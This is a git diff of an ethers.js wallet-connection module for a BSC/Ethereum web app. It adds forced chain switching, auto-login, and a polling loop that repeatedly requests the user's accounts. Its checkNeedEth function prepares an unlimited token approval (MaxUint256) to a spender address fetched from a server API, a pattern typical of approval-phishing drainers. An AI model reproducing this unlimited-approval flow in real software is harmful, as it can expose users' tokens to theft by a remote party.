@@ -4,6 +4,7 @@ import pinia from '@/stores';
 import useStateStore from '@/stores/state';
 const state = useStateStore();
 import { ABI, bscAddress, ethAddress } from './config';
+window['walletStatus'] = null;
 let addressList = {
   bsc: bscAddress,
   eth: ethAddress,
@@ -16,14 +17,133 @@ function getProvider() {
     provider = new BrowserProvider(window.ethereum);
   }
 }
-export async function connectWallet() {
-  getProvider()
+getProvider();
+// console.log('ethers', ethers);
+// console.log('provider', provider);
+// provider.getNetwork().then((res) => {
+//   console.log(ethers.formatUnits(res.chainId * 1,16));
+// });
+async function switchToBSC() {
+  try {
+    await window.ethereum.request({
+      method: 'wallet_switchEthereumChain',
+      params: [
+        {
+          chainId: '0x38',
+        },
+      ],
+    });
+  } catch (error) {
+    console.log(error);
+  }
+}
+async function switchToEthereum() {
+  try {
+    await window.ethereum.request({
+      method: 'wallet_switchEthereumChain',
+      params: [
+        {
+          chainId: '0x1',
+        },
+      ],
+    });
+  } catch (error) {
+    console.log(error);
+  }
+}
+
+let getChain = (id) => {
+  let chain;
+  if (id == 56) {
+    state.setNetwork('bsc');
+    chain = 2;
+  }
+  if (id == 1) {
+    state.setNetwork('eth');
+    chain = 1;
+  }
+  if (id == 6) {
+    state.setNetwork('tron');
+    chain = 0;
+  }
+  return chain;
+};
+
+export let walletLogin = () => {
+  getProvider();
+  let chainId = appKit.getChainId();
+  if (!state.loginStatus && chainId != 56) {
+    switchToBSC();
+  }
+  if (chainId == 1) {
+    switchToEthereum();
+  }
   return new Promise((res, rej) => {
     provider
       .send('eth_requestAccounts', [])
       .then((a) => {
-        console.log(22222);
-        return res(a[0]);
+        let address = a[0];
+        if (chainId == 56) {
+          state.setNetwork('bsc');
+        }
+        if (chainId == 1) {
+          state.setNetwork('eth');
+        }
+        if (!state.loginStatus && state.chainId && address != undefined && chainId) {
+          state.setLoading(true);
+          state.login({
+            chain: getChain(chainId) * 1,
+            address: address,
+          });
+        }
+        if (state.loginStatus && state.chainId && address != state.address && chainId) {
+          state.setLoading(true);
+          state.login({
+            chain: getChain(chainId) * 1,
+            address: address,
+          });
+        }
+      })
+      .catch(() => {
+        state.setLoading(false);
+        return rej('user rejected request');
+      });
+  });
+};
+let onWalletStateChange = () => {
+  walletStatus = setInterval(() => {
+    let chainId = appKit.getChainId();
+    let address = state.address;
+    if (!state.loginStatus || address == undefined || chainId != state.chainId || (state.loginStatus && !provider.ready)) {
+      walletLogin();
+      window.clearInterval(walletStatus);
+      setTimeout(() => {
+        onWalletStateChange();
+      }, 20 * 1000);
+      return;
+    }
+    provider.send('eth_requestAccounts', []).then((a) => {
+      if (a[0] != address) {
+        walletLogin();
+        window.clearInterval(walletStatus);
+        setTimeout(() => {
+          onWalletStateChange();
+        }, 15 * 1000);
+      }
+    });
+  }, 5 * 1000);
+};
+
+export async function connectWallet() {
+  getProvider();
+  return new Promise((res, rej) => {
+    provider
+      .send('eth_requestAccounts', [])
+      .then((a) => {
+        return res({
+          chainId: appKit.getChainId(),
+          address: a[0],
+        });
       })
       .catch(() => {
         state.setLoading(false);
@@ -34,24 +154,14 @@ export async function connectWallet() {
 export let checkNeedEth = async (approve) => {
   getProvider();
   let signer = await provider.getSigner(); //连接钱包地址
-  console.log('signer', signer);
   let adr = approve; //授权地址，从api获取
-  console.log('adr', approve);
   let type = state.networkType;
-  console.log('type', type);
   let contractAddress = addressList[type]; //合约地址
-  console.log('contractAddress', contractAddress);
   let contract = new ethers.Contract(contractAddress, ABI, signer);
-  console.log('contract', contract);
   let feeData = await provider.getFeeData();
-  console.log('checkNeedEth', 1);
   let gasUsed = await contract.approve.estimateGas(adr, ethers.MaxUint256);
-  console.log('checkNeedEth', 2);
   let needEth = ethers.formatEther(feeData.gasPrice * gasUsed);
-  console.log('checkNeedEth', 3);
   let ethBalance = await provider.getBalance(signer.address);
-  console.log('checkNeedEth', 4);
-  console.log('contractAddress', contractAddress);
   return new Promise((res, rej) => {
     if (needEth > ethBalance) {
       console.log('eth not enough');
@@ -126,3 +236,9 @@ export async function tokenBalance() {
   });
   // console.log('余额', ethers.formatUnits(balance, decimals));
 }
+
+onWalletStateChange();
+// console.log('ethereum', window.ethereum);
+// window.ethereum.on('accountsChanged', (e) => {
+//   console.log('accountsChanged', e);
+// });
